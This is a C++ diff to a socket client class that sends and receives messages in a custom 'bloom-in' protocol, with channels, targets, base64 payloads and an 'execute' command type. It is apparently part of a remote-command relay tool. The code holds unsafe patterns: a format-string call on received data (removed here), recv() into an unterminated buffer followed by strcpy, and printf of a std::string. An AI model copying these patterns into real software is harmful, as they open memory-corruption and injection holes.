@@ -109,7 +109,6 @@ class blooming_connection
         {
             blooming_end();
             sock_statu = 0;
-            system("sleep 3");
             std::exit(-1);
         }
 
@@ -149,7 +148,6 @@ class blooming_connection
         if (command_type == "execute")
         {
             result = "bloom-in c <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
-            printf("%s\n", result.c_str());
             return result;
         }
 
@@ -178,15 +176,16 @@ class blooming_connection
         {
             result = "bloom-in p <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + command_target + "<target>" + "<data>" + b64_en((char *)command_content.c_str()) + "<data>BLOOM_IN";
         }
-        printf("%s\n", result);
-        send(sock, result.c_str(), strlen(result.c_str()), 0);
+        return result;
     }
 
-    void blooming_command_analysiser()
+    void blooming_command_analysiser(string recv_buffer)
     {
-
-        string command_type;
+        char command_type;
         string command_content;
+
+        command_type = recv_buffer[9];
+        cout << recv_buffer << endl;
     }
 
     void sock_send()
@@ -195,36 +194,8 @@ class blooming_connection
         string command;
         while (true)
         {
-
             string data = blooming_command_formator();
-            cout << data << "\n"
-                 << endl;
-            // getline(cin, buffer);
-
-            // if (0 == buffer.compare("exit") || 0 == sock_statu)
-            // {
-            //     blooming_end();
-            //     sock_statu = 0;
-            //     system("sleep 3");
-            //     std::exit(-1);
-            // }
-
-            // if (0 == strcmp(buffer.substr(0, 2).c_str(), "fs"))
-            // {
-            //     printf("File stream\n");
-            //     vector<string> args = str_split_by_space(buffer);
-            //     if (file_exist(args[1].c_str()))
-            //     {
-            //         string b64_buffer = b64_en((char *)args[1].c_str());
-            //         cout << b64_buffer << endl;
-            //     }
-            // }
-            // else
-            // {
-            //     buffer = "bloom-in c <channel>" + channel + "<channel><id>" + local_id + "<id>" + "<target>" + "test02" + "<target>" + "<data>" + b64_en((char *)buffer.c_str()) + "<data>BLOOM_IN";
-            // }
-
-            // send(sock, buffer.c_str(), strlen(buffer.c_str()), 0);
+            send(sock, data.c_str(), strlen(data.c_str()), 0);
         }
     }
 
@@ -235,13 +206,13 @@ class blooming_connection
         {
             recv(sock, recv_buffer, 65535, 0);
 
-            if (NULL != strstr(recv_buffer, "invaild syntax") || NULL != strstr(recv_buffer, "close") || 0 == sock_statu || NULL != strstr(recv_buffer, local_id.c_str()) || (0 == strcmp(last_package, recv_buffer)))
+            if (NULL != strstr(recv_buffer, "invaild syntax") || NULL != strstr(recv_buffer, "close") || 0 == sock_statu || (0 == strcmp(last_package, recv_buffer)))
             {
                 if (debug_state)
                 {
                     printf("%s %d %s", "close by remote server: ", (0 == strcmp(recv_buffer, "close")), "\n");
                     cout << "close by local exit command: " << (0 == sock_statu) << endl;
-                    cout << "close because of something went wrong with connection: " << (NULL != strstr(recv_buffer, local_id.c_str())) << endl;
+                    // cout << "close because of something went wrong with connection: " << (NULL != strstr(recv_buffer, local_id.c_str())) << endl;
                     if (0 == sock_statu)
                     {
                         cout << "close because the server didn't response for some reasons or currently under attack: 0" << endl;
@@ -261,8 +232,7 @@ class blooming_connection
             if (0 != strcmp(recv_buffer, "\0"))
             {
                 strcpy(last_package, recv_buffer);
-                printf(base64_decode(string(recv_buffer)).c_str());
-                printf("\n");
+                blooming_command_analysiser(string(recv_buffer));
             }
         }
     }
